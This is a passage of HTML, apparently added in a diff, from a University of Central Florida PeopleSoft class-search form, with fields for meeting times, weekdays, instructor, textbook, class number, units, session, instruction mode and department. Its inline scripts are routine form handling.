+<option value="E">is exactly</option>
+<option value="LT">less than</option>
+<option value="LE">less than or equal to</option>
+</select></div>
+</td>
+<td align="left" colspan="5" nowrap="nowrap" rowspan="2" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_MEETING_TIME_START$7"><input class="PSEDITBOX" id="SSR_CLSRCH_WRK_MEETING_TIME_START$7" maxlength="7" name="SSR_CLSRCH_WRK_MEETING_TIME_START$7" onchange="addchg_win0(this);oChange_win0=this;" style="width:56px; " tabindex="545" type="text" value=""/></div>
+</td>
+</tr>
+<tr>
+<td height="20"></td>
+<td align="right" colspan="3" rowspan="2" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_MEETING_TIME_STARTlbl$7"><label class="PSEDITBOXLABEL" for="SSR_CLSRCH_WRK_MEETING_TIME_START$7" id="SSR_CLSRCH_WRK_MEETING_TIME_START_LBL$7">Meeting Start Time</label></div>
+</td>
+</tr>
+<tr>
+<td height="4"></td>
+<td colspan="5"></td>
+<td align="left" colspan="9" rowspan="2" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_SSR_END_TIME_OPR$7"><select class="PSDROPDOWNLIST" id="SSR_CLSRCH_WRK_SSR_END_TIME_OPR$7" name="SSR_CLSRCH_WRK_SSR_END_TIME_OPR$7" onchange="addchg_win0(this);submitAction_win0(this.form,this.id);" onkeydown="if ((typeof isLoaderInProcess == 'function') &amp;&amp; isLoaderInProcess() &amp;&amp; ptCommonObj2!=null) { ptCommonObj2.terminateEvent(event); } " size="1" style="width:230px; " tabindex="547">
+<option value=""> </option>
+<option value="BT">between</option>
+<option value="GT">greater than</option>
+<option value="GE">greater than or equal to</option>
+<option value="E">is exactly</option>
+<option value="LT">less than</option>
+<option selected="selected" value="LE">less than or equal to</option>
+</select></div>
+</td>
+<td align="left" colspan="5" nowrap="nowrap" rowspan="2" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_MEETING_TIME_END$7"><input class="PSEDITBOX" id="SSR_CLSRCH_WRK_MEETING_TIME_END$7" maxlength="7" name="SSR_CLSRCH_WRK_MEETING_TIME_END$7" onchange="addchg_win0(this);oChange_win0=this;" style="width:56px; " tabindex="548" type="text" value=""/></div>
+</td>
+</tr>
+<tr>
+<td height="20"></td>
+<td align="right" colspan="4" rowspan="2" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_MEETING_TIME_ENDlbl$7"><label class="PSEDITBOXLABEL" for="SSR_CLSRCH_WRK_MEETING_TIME_END$7" id="SSR_CLSRCH_WRK_MEETING_TIME_END_LBL$7">Meeting End Time</label></div>
+</td>
+</tr>
+<tr>
+<td height="4"></td>
+<td colspan="4"></td>
+<td align="left" colspan="14" rowspan="2" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_INCLUDE_CLASS_DAYS$8"><select class="PSDROPDOWNLIST" id="SSR_CLSRCH_WRK_INCLUDE_CLASS_DAYS$8" name="SSR_CLSRCH_WRK_INCLUDE_CLASS_DAYS$8" onchange="addchg_win0(this);return doEdits_win0(this,'','N','N','N','N','Y','Y',0);" onkeydown="if ((typeof isLoaderInProcess == 'function') &amp;&amp; isLoaderInProcess() &amp;&amp; ptCommonObj2!=null) { ptCommonObj2.terminateEvent(event); } " size="1" style="width:230px; " tabindex="614">
+<option value=""> </option>
+<option value="F">exclude any of these days</option>
+<option value="E">exclude only these days</option>
+<option value="J">include any of these days</option>
+<option selected="selected" value="I">include only these days</option>
+</select></div>
+</td>
+</tr>
+<tr>
+<td height="19"></td>
+<td align="right" colspan="5" rowspan="4" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_INCLUDE_CLASS_DAYSlbl$8"><label class="PSDROPDOWNLABEL" for="SSR_CLSRCH_WRK_INCLUDE_CLASS_DAYS$8" id="SSR_CLSRCH_WRK_INCLUDE_CLASS_DAYS_LBL$8">Days of Week</label></div>
+</td>
+</tr>
+<tr>
+<td height="1"></td>
+<td colspan="16"></td>
+<td align="left" nowrap="nowrap" rowspan="2" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_SUN$8"><input id="SSR_CLSRCH_WRK_SUN$chk$8" name="SSR_CLSRCH_WRK_SUN$chk$8" type="hidden" value=""/><input class="PSCHECKBOX" id="SSR_CLSRCH_WRK_SUN$8" name="SSR_CLSRCH_WRK_SUN$8" onclick="setupTimeout2();    this.form.SSR_CLSRCH_WRK_SUN$chk$8.value=(this.checked?'Y':'N');doFocus_win0(this,false,true);" tabindex="621" type="checkbox" value="Y"/><label class="PSCHECKBOX" for="SSR_CLSRCH_WRK_SUN$8" id="SSR_CLSRCH_WRK_SUN_LBL$8">Sun</label></div>
+</td>
+</tr>
+<tr>
+<td height="28"></td>
+<td colspan="4" rowspan="4"></td>
+<td align="left" colspan="3" nowrap="nowrap" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_MON$8"><input id="SSR_CLSRCH_WRK_MON$chk$8" name="SSR_CLSRCH_WRK_MON$chk$8" type="hidden" value=""/><input class="PSCHECKBOX" id="SSR_CLSRCH_WRK_MON$8" name="SSR_CLSRCH_WRK_MON$8" onclick="setupTimeout2();    this.form.SSR_CLSRCH_WRK_MON$chk$8.value=(this.checked?'Y':'N');doFocus_win0(this,false,true);" tabindex="615" type="checkbox" value="Y"/><label class="PSCHECKBOX" for="SSR_CLSRCH_WRK_MON$8" id="SSR_CLSRCH_WRK_MON_LBL$8">Mon</label></div>
+</td>
+<td align="left" nowrap="nowrap" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_TUES$8"><input id="SSR_CLSRCH_WRK_TUES$chk$8" name="SSR_CLSRCH_WRK_TUES$chk$8" type="hidden" value=""/><input class="PSCHECKBOX" id="SSR_CLSRCH_WRK_TUES$8" name="SSR_CLSRCH_WRK_TUES$8" onclick="setupTimeout2();    this.form.SSR_CLSRCH_WRK_TUES$chk$8.value=(this.checked?'Y':'N');doFocus_win0(this,false,true);" tabindex="616" type="checkbox" value="Y"/><label class="PSCHECKBOX" for="SSR_CLSRCH_WRK_TUES$8" id="SSR_CLSRCH_WRK_TUES_LBL$8">Tues</label></div>
+</td>
+<td align="left" colspan="2" nowrap="nowrap" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_WED$8"><input id="SSR_CLSRCH_WRK_WED$chk$8" name="SSR_CLSRCH_WRK_WED$chk$8" type="hidden" value=""/><input class="PSCHECKBOX" id="SSR_CLSRCH_WRK_WED$8" name="SSR_CLSRCH_WRK_WED$8" onclick="setupTimeout2();    this.form.SSR_CLSRCH_WRK_WED$chk$8.value=(this.checked?'Y':'N');doFocus_win0(this,false,true);" tabindex="617" type="checkbox" value="Y"/><label class="PSCHECKBOX" for="SSR_CLSRCH_WRK_WED$8" id="SSR_CLSRCH_WRK_WED_LBL$8">Wed</label></div>
+</td>
+<td align="left" colspan="4" nowrap="nowrap" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_THURS$8"><input id="SSR_CLSRCH_WRK_THURS$chk$8" name="SSR_CLSRCH_WRK_THURS$chk$8" type="hidden" value=""/><input class="PSCHECKBOX" id="SSR_CLSRCH_WRK_THURS$8" name="SSR_CLSRCH_WRK_THURS$8" onclick="setupTimeout2();    this.form.SSR_CLSRCH_WRK_THURS$chk$8.value=(this.checked?'Y':'N');doFocus_win0(this,false,true);" tabindex="618" type="checkbox" value="Y"/><label class="PSCHECKBOX" for="SSR_CLSRCH_WRK_THURS$8" id="SSR_CLSRCH_WRK_THURS_LBL$8">Thurs</label></div>
+</td>
+<td align="left" nowrap="nowrap" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_FRI$8"><input id="SSR_CLSRCH_WRK_FRI$chk$8" name="SSR_CLSRCH_WRK_FRI$chk$8" type="hidden" value=""/><input class="PSCHECKBOX" id="SSR_CLSRCH_WRK_FRI$8" name="SSR_CLSRCH_WRK_FRI$8" onclick="setupTimeout2();    this.form.SSR_CLSRCH_WRK_FRI$chk$8.value=(this.checked?'Y':'N');doFocus_win0(this,false,true);" tabindex="619" type="checkbox" value="Y"/><label class="PSCHECKBOX" for="SSR_CLSRCH_WRK_FRI$8" id="SSR_CLSRCH_WRK_FRI_LBL$8">Fri</label></div>
+</td>
+<td align="left" nowrap="nowrap" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_SAT$8"><input id="SSR_CLSRCH_WRK_SAT$chk$8" name="SSR_CLSRCH_WRK_SAT$chk$8" type="hidden" value=""/><input class="PSCHECKBOX" id="SSR_CLSRCH_WRK_SAT$8" name="SSR_CLSRCH_WRK_SAT$8" onclick="setupTimeout2();    this.form.SSR_CLSRCH_WRK_SAT$chk$8.value=(this.checked?'Y':'N');doFocus_win0(this,false,true);" tabindex="620" type="checkbox" value="Y"/><label class="PSCHECKBOX" for="SSR_CLSRCH_WRK_SAT$8" id="SSR_CLSRCH_WRK_SAT_LBL$8">Sat</label></div>
+</td>
+</tr>
+<tr>
+<td height="5"></td>
+<td align="left" colspan="5" rowspan="3" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_SSR_EXACT_MATCH2$9"><select class="PSDROPDOWNLIST" id="SSR_CLSRCH_WRK_SSR_EXACT_MATCH2$9" name="SSR_CLSRCH_WRK_SSR_EXACT_MATCH2$9" onchange="addchg_win0(this);return doEdits_win0(this,'','N','N','N','N','Y','Y',0);" onkeydown="if ((typeof isLoaderInProcess == 'function') &amp;&amp; isLoaderInProcess() &amp;&amp; ptCommonObj2!=null) { ptCommonObj2.terminateEvent(event); } " size="1" style="width:207px; " tabindex="690">
+<option value=""> </option>
+<option selected="selected" value="B">begins with</option>
+<option value="C">contains</option>
+<option value="E">is exactly</option>
+</select></div>
+</td>
+<td colspan="2" rowspan="3"></td>
+<td align="left" colspan="6" nowrap="nowrap" rowspan="4" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_LAST_NAME$9"><input class="PSEDITBOX" id="SSR_CLSRCH_WRK_LAST_NAME$9" maxlength="30" name="SSR_CLSRCH_WRK_LAST_NAME$9" style="width:184px; " tabindex="691" type="text" value=""/></div>
+</td>
+</tr>
+<tr>
+<td height="1"></td>
+<td align="right" colspan="3" rowspan="3" valign="top">
+<div id="win0divSR_LBL_WRK_INSTRCTOR_LBLlbl$9"><span class="PSEDITBOXLABEL">Instructor Last Name</span></div>
+</td>
+</tr>
+<tr>
+<td height="16"></td>
+<td colspan="2" rowspan="11"></td>
+<td align="left" rowspan="24" valign="top">
+<div id="win0divSR_LBL_WRK_INSTRCTOR_LBL$9"><span class="PTTRANSPARENT" id="SR_LBL_WRK_INSTRCTOR_LBL$9"> </span></div>
+</td>
+</tr>
+<tr>
+<td height="4"></td>
+<td colspan="3"></td>
+<td align="left" colspan="8" rowspan="2" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_SSR_CAF_TVAL_OPR$10"><select class="PSDROPDOWNLIST" id="SSR_CLSRCH_WRK_SSR_CAF_TVAL_OPR$10" name="SSR_CLSRCH_WRK_SSR_CAF_TVAL_OPR$10" onchange="addchg_win0(this);return doEdits_win0(this,'','N','N','N','N','Y','Y',0);" onkeydown="if ((typeof isLoaderInProcess == 'function') &amp;&amp; isLoaderInProcess() &amp;&amp; ptCommonObj2!=null) { ptCommonObj2.terminateEvent(event); } " size="1" style="width:207px; " tabindex="779">
+<option value=""> </option>
+<option selected="selected" value="B">begins with</option>
+<option value="C">contains</option>
+<option value="E">is exactly</option>
+</select></div>
+</td>
+</tr>
+<tr>
+<td height="28"></td>
+<td align="right" rowspan="2" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_SCC_CAF_ATTRIB_NMlbl$10"><span class="PSDROPDOWNLABEL">Instructor First Name</span></div>
+</td>
+<td colspan="2" rowspan="9"></td>
+<td colspan="2" rowspan="9"></td>
+<td align="left" rowspan="2" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_SCC_CAF_ATTRIB_NM$10"><span class="PTTRANSPARENT" id="SSR_CLSRCH_WRK_SCC_CAF_ATTRIB_NM$10">Instructor First Name</span></div>
+</td>
+<td align="left" colspan="6" nowrap="nowrap" rowspan="2" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_SCC_CAF_ATTR_TVAL$10"><input class="PSEDITBOX" id="SSR_CLSRCH_WRK_SCC_CAF_ATTR_TVAL$10" maxlength="50" name="SSR_CLSRCH_WRK_SCC_CAF_ATTR_TVAL$10" style="width:184px; " tabindex="783" type="text" value=""/></div>
+</td>
+</tr>
+<tr>
+<td height="4"></td>
+<td align="left" colspan="8" rowspan="2" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_SSR_CAF_TVAL_OPR$11"><select class="PSDROPDOWNLIST" id="SSR_CLSRCH_WRK_SSR_CAF_TVAL_OPR$11" name="SSR_CLSRCH_WRK_SSR_CAF_TVAL_OPR$11" onchange="addchg_win0(this);return doEdits_win0(this,'','N','N','N','N','Y','Y',0);" onkeydown="if ((typeof isLoaderInProcess == 'function') &amp;&amp; isLoaderInProcess() &amp;&amp; ptCommonObj2!=null) { ptCommonObj2.terminateEvent(event); } " size="1" style="width:207px; " tabindex="843">
+<option value=""> </option>
+<option selected="selected" value="B">begins with</option>
+<option value="C">contains</option>
+<option value="E">is exactly</option>
+</select></div>
+</td>
+</tr>
+<tr>
+<td height="28"></td>
+<td align="right" rowspan="2" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_SCC_CAF_ATTRIB_NMlbl$11"><span class="PSDROPDOWNLABEL">Textbook Title</span></div>
+</td>
+<td align="left" rowspan="2" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_SCC_CAF_ATTRIB_NM$11"><span class="PTTRANSPARENT" id="SSR_CLSRCH_WRK_SCC_CAF_ATTRIB_NM$11">Textbook Title</span></div>
+</td>
+<td align="left" colspan="6" nowrap="nowrap" rowspan="2" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_SCC_CAF_ATTR_TVAL$11"><input class="PSEDITBOX" id="SSR_CLSRCH_WRK_SCC_CAF_ATTR_TVAL$11" maxlength="50" name="SSR_CLSRCH_WRK_SCC_CAF_ATTR_TVAL$11" style="width:184px; " tabindex="847" type="text" value=""/></div>
+</td>
+</tr>
+<tr>
+<td height="4"></td>
+<td align="left" colspan="8" rowspan="2" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_SSR_CAF_TVAL_OPR$12"><select class="PSDROPDOWNLIST" id="SSR_CLSRCH_WRK_SSR_CAF_TVAL_OPR$12" name="SSR_CLSRCH_WRK_SSR_CAF_TVAL_OPR$12" onchange="addchg_win0(this);return doEdits_win0(this,'','N','N','N','N','Y','Y',0);" onkeydown="if ((typeof isLoaderInProcess == 'function') &amp;&amp; isLoaderInProcess() &amp;&amp; ptCommonObj2!=null) { ptCommonObj2.terminateEvent(event); } " size="1" style="width:207px; " tabindex="907">
+<option value=""> </option>
+<option selected="selected" value="B">begins with</option>
+<option value="C">contains</option>
+<option value="E">is exactly</option>
+</select></div>
+</td>
+</tr>
+<tr>
+<td height="28"></td>
+<td align="right" rowspan="2" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_SCC_CAF_ATTRIB_NMlbl$12"><span class="PSDROPDOWNLABEL">Textbook Author</span></div>
+</td>
+<td align="left" rowspan="2" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_SCC_CAF_ATTRIB_NM$12"><span class="PTTRANSPARENT" id="SSR_CLSRCH_WRK_SCC_CAF_ATTRIB_NM$12">Textbook Author</span></div>
+</td>
+<td align="left" colspan="6" nowrap="nowrap" rowspan="2" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_SCC_CAF_ATTR_TVAL$12"><input class="PSEDITBOX" id="SSR_CLSRCH_WRK_SCC_CAF_ATTR_TVAL$12" maxlength="50" name="SSR_CLSRCH_WRK_SCC_CAF_ATTR_TVAL$12" style="width:184px; " tabindex="911" type="text" value=""/></div>
+</td>
+</tr>
+<tr>
+<td height="4"></td>
+<td align="left" colspan="8" rowspan="2" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_SSR_CAF_TVAL_OPR$13"><select class="PSDROPDOWNLIST" id="SSR_CLSRCH_WRK_SSR_CAF_TVAL_OPR$13" name="SSR_CLSRCH_WRK_SSR_CAF_TVAL_OPR$13" onchange="addchg_win0(this);return doEdits_win0(this,'','N','N','N','N','Y','Y',0);" onkeydown="if ((typeof isLoaderInProcess == 'function') &amp;&amp; isLoaderInProcess() &amp;&amp; ptCommonObj2!=null) { ptCommonObj2.terminateEvent(event); } " size="1" style="width:207px; " tabindex="971">
+<option value=""> </option>
+<option selected="selected" value="B">begins with</option>
+<option value="C">contains</option>
+<option value="E">is exactly</option>
+</select></div>
+</td>
+</tr>
+<tr>
+<td height="28"></td>
+<td align="right" rowspan="3" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_SCC_CAF_ATTRIB_NMlbl$13"><span class="PSDROPDOWNLABEL">Syllabus</span></div>
+</td>
+<td align="left" rowspan="16" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_SCC_CAF_ATTRIB_NM$13"><span class="PTTRANSPARENT" id="SSR_CLSRCH_WRK_SCC_CAF_ATTRIB_NM$13">Syllabus</span></div>
+</td>
+<td align="left" colspan="6" nowrap="nowrap" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_SCC_CAF_ATTR_TVAL$13"><input class="PSEDITBOX" id="SSR_CLSRCH_WRK_SCC_CAF_ATTR_TVAL$13" maxlength="50" name="SSR_CLSRCH_WRK_SCC_CAF_ATTR_TVAL$13" style="width:184px; " tabindex="975" type="text" value=""/></div>
+</td>
+</tr>
+<tr>
+<td height="1"></td>
+<td colspan="3"></td>
+<td align="left" colspan="11" nowrap="nowrap" rowspan="3" valign="top">
+<div id="win0divDERIVED_AS_LBL_ES_EXAMPLE_LBL2$14"><a href="javascript:submitAction_win0(document.win0,'DERIVED_AS_LBL_ES_EXAMPLE_LBL2$14');" id="DERIVED_AS_LBL_ES_EXAMPLE_LBL2$14" name="DERIVED_AS_LBL_ES_EXAMPLE_LBL2$14" onclick="javascript:MOpopupObj_win0.StopPopup(); cancelBubble(event);" role="button" tabindex="1008"><img alt="(example: 12345)" border="0" class="PSPUSHBUTTON_MO" id="DERIVED_AS_LBL_ES_EXAMPLE_LBL2$IMG$14" onkeydown="if (mouseoverHotkeyHandler(event)) MOpopupObj_win0.StartPopup('win0divDERIVED_AS_LBL_ES_EXAMPLE_LBL2$14', 'DERIVED_AS_LBL_ES_EXAMPLE_LBL2$14_14690_3144', 0, 0);" onmouseout="MOpopupObj_win0.StopPopup(); " onmouseover="MOpopupObj_win0.StartPopup('win0divDERIVED_AS_LBL_ES_EXAMPLE_LBL2$14', 'DERIVED_AS_LBL_ES_EXAMPLE_LBL2$14_14690_3144', 0, 0);" src="https://csprod-ss.net.ucf.edu/cs/CSPROD/cache9/PT_HELP_SWAN_1.gif" tabindex="1008"/></a></div>
+<div id="DERIVED_AS_LBL_ES_EXAMPLE_LBL2$14_14690_3144" style="display:none; position:absolute; max-width:400px; top:0; left:0;"><span class="PTPOPUP_MSGHDR" style="display:block;">example: 12345</span><br/>
+</div>
+</td>
+</tr>
+<tr>
+<td height="3"></td>
+<td rowspan="2"></td>
+<td align="left" colspan="2" nowrap="nowrap" rowspan="2" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_CLASS_NBR$14"><input class="PSEDITBOX" id="SSR_CLSRCH_WRK_CLASS_NBR$14" maxlength="5" name="SSR_CLSRCH_WRK_CLASS_NBR$14" onchange="addchg_win0(this);return doEdits_win0(this,'S(5.0)','N','N','N','N','N','N',/^ *[0-9\,]*(\.[0-9\,]*)? *$/);" style="width:41px; text-align:right; " tabindex="1006" type="text" value=""/></div>
+</td>
+</tr>
+<tr>
+<td height="19"></td>
+<td align="right" colspan="6" rowspan="2" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_CLASS_NBRlbl$14"><label class="PSEDITBOXLABEL" for="SSR_CLSRCH_WRK_CLASS_NBR$14" id="SSR_CLSRCH_WRK_CLASS_NBR_LBL$14">Class Nbr</label></div>
+</td>
+</tr>
+<tr>
+<td height="4"></td>
+<td rowspan="12"></td>
+<td align="left" colspan="10" rowspan="2" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_SSR_UNITS_MIN_OPR$15"><select class="PSDROPDOWNLIST" id="SSR_CLSRCH_WRK_SSR_UNITS_MIN_OPR$15" name="SSR_CLSRCH_WRK_SSR_UNITS_MIN_OPR$15" onchange="addchg_win0(this);return doEdits_win0(this,'','N','N','N','N','Y','Y',0);" onkeydown="if ((typeof isLoaderInProcess == 'function') &amp;&amp; isLoaderInProcess() &amp;&amp; ptCommonObj2!=null) { ptCommonObj2.terminateEvent(event); } " size="1" style="width:230px; " tabindex="1080">
+<option value=""> </option>
+<option value="GT">greater than</option>
+<option selected="selected" value="GE">greater than or equal to</option>
+<option value="E">is exactly</option>
+<option value="LT">less than</option>
+<option value="LE">less than or equal to</option>
+</select></div>
+</td>
+<td align="left" colspan="4" nowrap="nowrap" rowspan="3" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_UNITS_MINIMUM$15"><input class="PSEDITBOX" id="SSR_CLSRCH_WRK_UNITS_MINIMUM$15" maxlength="6" name="SSR_CLSRCH_WRK_UNITS_MINIMUM$15" onchange="addchg_win0(this);return doEdits_win0(this,'S(3.2)','N','N','N','N','N','N',/^ *[0-9\,]*(\.[0-9\,]*)? *$/);" style="width:56px; text-align:right; " tabindex="1081" type="text" value=""/></div>
+</td>
+</tr>
+<tr>
+<td height="16"></td>
+<td align="right" colspan="2" rowspan="2" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_UNITS_MINIMUMlbl$15"><label class="PSEDITBOXLABEL" for="SSR_CLSRCH_WRK_UNITS_MINIMUM$15" id="SSR_CLSRCH_WRK_UNITS_MINIMUM_LBL$15">Minimum Units</label></div>
+</td>
+</tr>
+<tr>
+<td height="4"></td>
+<td colspan="4" rowspan="3"></td>
+<td align="left" colspan="10" rowspan="2" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_SSR_UNITS_MAX_OPR$15"><select class="PSDROPDOWNLIST" id="SSR_CLSRCH_WRK_SSR_UNITS_MAX_OPR$15" name="SSR_CLSRCH_WRK_SSR_UNITS_MAX_OPR$15" onchange="addchg_win0(this);return doEdits_win0(this,'','N','N','N','N','Y','Y',0);" onkeydown="if ((typeof isLoaderInProcess == 'function') &amp;&amp; isLoaderInProcess() &amp;&amp; ptCommonObj2!=null) { ptCommonObj2.terminateEvent(event); } " size="1" style="width:230px; " tabindex="1082">
+<option value=""> </option>
+<option value="GT">greater than</option>
+<option value="GE">greater than or equal to</option>
+<option value="E">is exactly</option>
+<option value="LT">less than</option>
+<option selected="selected" value="LE">less than or equal to</option>
+</select></div>
+</td>
+</tr>
+<tr>
+<td height="22"></td>
+<td align="right" colspan="2" rowspan="2" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_UNITS_MAXIMUMlbl$15"><label class="PSEDITBOXLABEL" for="SSR_CLSRCH_WRK_UNITS_MAXIMUM$15" id="SSR_CLSRCH_WRK_UNITS_MAXIMUM_LBL$15">Maximum Units</label></div>
+</td>
+<td align="left" colspan="4" nowrap="nowrap" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_UNITS_MAXIMUM$15"><input class="PSEDITBOX" id="SSR_CLSRCH_WRK_UNITS_MAXIMUM$15" maxlength="6" name="SSR_CLSRCH_WRK_UNITS_MAXIMUM$15" onchange="addchg_win0(this);return doEdits_win0(this,'S(3.2)','N','N','N','N','N','N',/^ *[0-9\,]*(\.[0-9\,]*)? *$/);" style="width:56px; text-align:right; " tabindex="1083" type="text" value=""/></div>
+</td>
+</tr>
+<tr>
+<td height="4"></td>
+<td align="left" colspan="14" rowspan="2" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_SSR_COMPONENT$16"><select class="PSDROPDOWNLIST" id="SSR_CLSRCH_WRK_SSR_COMPONENT$16" name="SSR_CLSRCH_WRK_SSR_COMPONENT$16" onchange="addchg_win0(this);return doEdits_win0(this,'','N','N','N','N','Y','Y',0);" onkeydown="if ((typeof isLoaderInProcess == 'function') &amp;&amp; isLoaderInProcess() &amp;&amp; ptCommonObj2!=null) { ptCommonObj2.terminateEvent(event); } " size="1" style="width:230px; " tabindex="1148">
+<option selected="selected" value=""> </option>
+<option value="CLN">Clinical</option>
+<option value="CON">Continuance</option>
+<option value="DIS">Discussion</option>
+<option value="DRT">Dissertation</option>
+<option value="FLD">Field Studies</option>
+<option value="IND">Independent Study</option>
+<option value="INT">Internship</option>
+<option value="LAB">Laboratory</option>
+<option value="LEC">Lecture</option>
+<option value="MCL">Med-Clinical</option>
+<option value="MIS">Med-Independent Study</option>
+<option value="MLB">Med-Lab</option>
+<option value="MLC">Med-Lecture</option>
+<option value="MRS">Med-Research</option>
+<option value="MNT">Med_Internship</option>
+<option value="OTR">Other</option>
+<option value="PER">Performance</option>
+<option value="PRC">Practicum</option>
+<option value="RES">Research</option>
+<option value="RRP">Research/Report</option>
+<option value="SEM">Seminar</option>
+<option value="SUP">Supervision</option>
+<option value="THE">Thesis Research</option>
+<option value="TUT">Tutorial</option>
+</select></div>
+</td>
+</tr>
+<tr>
+<td height="16"></td>
+<td align="right" colspan="5" rowspan="2" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_SSR_COMPONENTlbl$16"><label class="PSDROPDOWNLABEL" for="SSR_CLSRCH_WRK_SSR_COMPONENT$16" id="SSR_CLSRCH_WRK_SSR_COMPONENT_LBL$16">Course Component</label></div>
+</td>
+</tr>
+<tr>
+<td height="4"></td>
+<td rowspan="5"></td>
+<td align="left" colspan="14" rowspan="2" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_SESSION_CODE$17"><select class="PSDROPDOWNLIST" id="SSR_CLSRCH_WRK_SESSION_CODE$17" name="SSR_CLSRCH_WRK_SESSION_CODE$17" onchange="addchg_win0(this);return doEdits_win0(this,'','N','N','N','N','Y','Y',0);" onkeydown="if ((typeof isLoaderInProcess == 'function') &amp;&amp; isLoaderInProcess() &amp;&amp; ptCommonObj2!=null) { ptCommonObj2.terminateEvent(event); } " size="1" style="width:230px; " tabindex="1180">
+<option selected="selected" value=""> </option>
+<option value="A">A - First Six Weeks</option>
+<option value="B">B - Second Six Weeks</option>
+<option value="C">C - Twelve Weeks</option>
+<option value="D">D - Eight Weeks</option>
+<option value="7W1">First Seven Week</option>
+<option value="4W4">Four Week - Fourth</option>
+<option value="MD1">Medical Year 1</option>
+<option value="MD2">Medical Year 2</option>
+<option value="MD3">Medical Year 3</option>
+<option value="MD4">Medical Year 4</option>
+<option value="MDY">Medical Year Session</option>
+<option value="1">Regular Academic Session</option>
+<option value="7W2">Second Seven Week</option>
+<option value="CM3">UCF Global Pathways</option>
+<option value="CM1">UCF Global Session I</option>
+<option value="CM2">UCF Global Session II</option>
+<option value="CM4">UCF Global Special</option>
+<option value="VAR">Variable Calendar</option>
+</select></div>
+</td>
+</tr>
+<tr>
+<td height="20"></td>
+<td align="right" colspan="5" rowspan="2" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_SESSION_CODElbl$17"><label class="PSDROPDOWNLABEL" for="SSR_CLSRCH_WRK_SESSION_CODE$17" id="SSR_CLSRCH_WRK_SESSION_CODE_LBL$17">Session</label></div>
+</td>
+</tr>
+<tr>
+<td height="4"></td>
+<td align="left" colspan="14" rowspan="2" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_INSTRUCTION_MODE$18"><select class="PSDROPDOWNLIST" id="SSR_CLSRCH_WRK_INSTRUCTION_MODE$18" name="SSR_CLSRCH_WRK_INSTRUCTION_MODE$18" onchange="addchg_win0(this);return doEdits_win0(this,'','N','N','N','N','Y','Y',0);" onkeydown="if ((typeof isLoaderInProcess == 'function') &amp;&amp; isLoaderInProcess() &amp;&amp; ptCommonObj2!=null) { ptCommonObj2.terminateEvent(event); } " size="1" style="width:230px; " tabindex="1277">
+<option selected="selected" value=""> </option>
+<option value="RA">Actve Lrng Reduce SeatTime(RA)</option>
+<option value="P">Face to Face (P)</option>
+<option value="RS">Limited Attendance (RS)</option>
+<option value="M">Mixed Mode (M)</option>
+<option value="V">Video (V)</option>
+<option value="RV">Video Str/ReducedSeatTime (RV)</option>
+<option value="V1">Video Strmng (V1) COVD DL exmp</option>
+<option value="WW">Web-Based (W)</option>
+</select></div>
+</td>
+</tr>
+<tr>
+<td height="16"></td>
+<td align="right" colspan="5" rowspan="2" valign="top">
+<div id="win0divSSR_CLSRCH_WRK_INSTRUCTION_MODElbl$18"><label class="PSDROPDOWNLABEL" for="SSR_CLSRCH_WRK_INSTRUCTION_MODE$18" id="SSR_CLSRCH_WRK_INSTRUCTION_MODE_LBL$18">Mode of Instruction</label></div>
+</td>
+</tr>
+<tr>
+<td height="4"></td>
+<td rowspan="2"></td>
+<td align="left" colspan="13" rowspan="2" valign="top">
+<div id="win0divATTR_VAL$19"><select class="PSDROPDOWNLIST" id="ATTR_VAL$19" name="ATTR_VAL$19" size="1" style="width:228px; " tabindex="1358">
+<option selected="selected" value=""> </option>
+<option value="ACCOUNTING">Accounting, Dixon Schl of</option>
+<option value="AFRIC AMER">African American Studies</option>
+<option value="ROTCAIRFOR">Air Force ROTC</option>
+<option value="ANTHRO">Anthropology</option>
+<option value="ROTCARMY">Army ROTC</option>
+<option value="ATHL TRNG">Athletic Training</option>
+<option value="BIOLOGY">Biology</option>
+<option value="BCBS">Biomed Sciences, Burnett Schl</option>
+<option value="CARDIOPULM">Cardiopulmonary Sci</option>
+<option value="CHEMISTRY">Chemistry</option>
+<option value="CIVIL">Civil, Environ, &amp; Constr Engr</option>
+<option value="GRDSTUDIES">College of Graduate Studies</option>
+<option value="NSCM">Comm &amp; Media, Nicholson Schl</option>
+<option value="COMM DIS">Comm Sci &amp; Disorders, Schl of</option>
